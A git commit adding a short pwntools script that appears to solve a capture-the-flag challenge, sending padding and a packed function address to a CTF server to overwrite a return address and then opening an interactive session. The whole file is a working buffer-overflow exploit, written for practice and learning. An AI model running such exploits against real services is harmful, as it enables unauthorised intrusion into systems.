5a77f28ec80253536ad7666b26422c0d32747841
wuling31715 <wuling31715@gmail.com>
2020-04-07 20:30:22 +0800

    .

---
+++ bamboofox/magic/main.py
@@ -0,0 +1,21 @@
+from pwn import *
+import struct
+
+# print(cyclic(100))
+# print(cyclic_find(b'l', n=1))
+
+ip = 'ctf.adl.tw'
+port = 11001
+
+r = remote(ip, port)
+show_me_magic = 0x0000000000400627
+# show_me_magic = 0x000000000040063c
+# show_me_magic = 0x400520
+# show_me_magic = 0x0b0225ff
+
+payload = "aaaabaaacaaadaaaeaaafaaa"
+payload += p64(show_me_magic)
+
+r.send(payload)
+r.interactive()
+
